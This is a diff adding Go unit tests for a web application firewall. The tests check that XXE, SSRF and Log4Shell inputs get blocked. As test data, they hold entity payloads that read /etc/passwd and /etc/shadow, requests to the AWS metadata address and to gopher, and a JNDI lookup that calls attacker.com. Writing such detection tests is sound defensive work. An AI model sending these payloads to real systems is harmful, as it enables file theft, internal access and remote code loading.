@@ -256,3 +256,186 @@ func containsCategory(matches []MatchedRule, category string) bool {
 	}
 	return false
 }
+
+// ─── XXE tests ────────────────────────────────────────────────────────────────
+
+func TestInspect_XXE_DocTypeEntityInBody_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	xmlPayload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
+	req := requestWith(http.MethodPost, "/upload", xmlPayload, map[string]string{
+		"Content-Type": "application/xml",
+	})
+	result := e.Inspect(req, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("XXE DOCTYPE+ENTITY payload should be blocked, score=%d matches=%d",
+			result.Score, len(result.MatchedRules))
+	}
+	if !containsCategory(result.MatchedRules, CategoryXXE) {
+		t.Error("matched rules should include XXE category")
+	}
+}
+
+func TestInspect_XXE_EntitySystemInBody_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	payload := `<!ENTITY myent SYSTEM "file:///etc/shadow">`
+	req := requestWith(http.MethodPost, "/parse", payload, nil)
+	result := e.Inspect(req, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("ENTITY SYSTEM payload should be blocked, score=%d", result.Score)
+	}
+}
+
+// ─── SSRF tests ───────────────────────────────────────────────────────────────
+
+func TestInspect_SSRF_Localhost_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	req := requestWith(http.MethodGet, "/?url=http://localhost/admin", "", nil)
+	result := e.Inspect(req, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("SSRF localhost in query should be blocked, score=%d", result.Score)
+	}
+	if !containsCategory(result.MatchedRules, CategorySSRF) {
+		t.Error("matched rules should include SSRF category")
+	}
+}
+
+func TestInspect_SSRF_AWSMetadata_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	req := requestWith(http.MethodGet, "/?resource=http://169.254.169.254/latest/meta-data/", "", nil)
+	result := e.Inspect(req, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("AWS IMDS URL should be blocked, score=%d", result.Score)
+	}
+}
+
+func TestInspect_SSRF_GopherScheme_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	req := requestWith(http.MethodPost, "/fetch", `{"url":"gopher://internal:6379/_SET key 1"}`, nil)
+	result := e.Inspect(req, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("gopher:// SSRF in body should be blocked, score=%d", result.Score)
+	}
+}
+
+// ─── Log4Shell / RCE CVE tests ────────────────────────────────────────────────
+
+func TestInspect_RCE_Log4Shell_Blocks(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	req := requestWith(http.MethodGet, "/", "", map[string]string{
+		"X-Api-Version": "${jndi:ldap://attacker.com/exploit}",
+	})
+	// Log4Shell in a header value
+	result := e.Inspect(req, siteWith("block"))
+	// Header fields aren't extracted by the WAF; but the URI/query match may vary.
+	// The payload in URI query string is what we test canonically:
+	req2 := requestWith(http.MethodGet, "/?v=${jndi:ldap://attacker.com/exploit}", "", nil)
+	result = e.Inspect(req2, siteWith("block"))
+	if !result.Blocked {
+		t.Errorf("Log4Shell ${jndi:...} in query should be blocked, score=%d", result.Score)
+	}
+}
+
+// ─── not_contains operator test ──────────────────────────────────────────────
+
+func TestMatchValue_NotContains(t *testing.T) {
+	cr := compileRule(Rule{
+		Name:     "TEST-NOT-CONTAINS",
+		Field:    FieldURI,
+		Operator: OpNotContains,
+		Value:    "admin",
+		Score:    10,
+		Action:   ActionDetect,
+	})
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		{"/api/public", true},   // does NOT contain "admin" → match
+		{"/api/admin", false},   // contains "admin" → no match
+		{"/ADMIN/panel", false}, // case-insensitive: contains "admin"
+	}
+	for _, tc := range tests {
+		got := matchValue(cr, tc.input)
+		if got != tc.want {
+			t.Errorf("not_contains(%q) = %v, want %v", tc.input, got, tc.want)
+		}
+	}
+}
+
+// ─── Paranoia level filter tests ─────────────────────────────────────────────
+
+func TestParanoia_Level1_ExcludesLevel3Rules(t *testing.T) {
+	e := New(nil, DefaultThreshold)
+	e.SetParanoiaLevel(1)
+	// Recompile to reflect new level (normally done by Reload; simulate here).
+	e.mu.Lock()
+	e.all = compileAll(allBuiltinRules(), nil, 1)
+	e.mu.Unlock()
+
+	// SQLI-HEX-ENCODE (level 3) — 0x41414141 should NOT be flagged at PL1.
+	req := requestWith(http.MethodGet, "/?data=0x41414141424343", "", nil)
+	result := e.Inspect(req, siteWith("block"))
+
+	for _, m := range result.MatchedRules {
+		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
+			t.Error("SQLI-HEX-ENCODE (level 3) should not fire at paranoia level 1")
+		}
+	}
+}
+
+func TestParanoia_Level4_IncludesAllRules(t *testing.T) {
+	e := New(nil, DefaultThreshold)
+	e.SetParanoiaLevel(4)
+	e.mu.Lock()
+	e.all = compileAll(allBuiltinRules(), nil, 4)
+	e.mu.Unlock()
+
+	// At paranoia level 4 the hex pattern (level 3) should fire.
+	req := requestWith(http.MethodGet, "/?data=0x41414141424343434545", "", nil)
+	result := e.Inspect(req, siteWith("detect"))
+	found := false
+	for _, m := range result.MatchedRules {
+		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Error("SQLI-HEX-ENCODE (level 3) should fire at paranoia level 4")
+	}
+}
+
+func TestCategories_ReturnsNonEmpty(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	cats := e.Categories()
+	if len(cats) == 0 {
+		t.Fatal("Categories() returned empty slice; expected built-in categories")
+	}
+	found := false
+	for _, c := range cats {
+		if c.Category == CategorySQLi {
+			found = true
+			if c.Builtin == 0 {
+				t.Errorf("SQLi category has Builtin=0")
+			}
+			break
+		}
+	}
+	if !found {
+		t.Error("expected to find sqli category in Categories()")
+	}
+}
+
+func TestBuiltinRules_ReturnsOnlyBuiltin(t *testing.T) {
+	e := newTestEngine(DefaultThreshold)
+	rules := e.BuiltinRules()
+	if len(rules) == 0 {
+		t.Fatal("BuiltinRules() returned empty slice")
+	}
+	for _, r := range rules {
+		if !r.Builtin {
+			t.Errorf("BuiltinRules() returned non-builtin rule: %s", r.Name)
+		}
+	}
+}
+
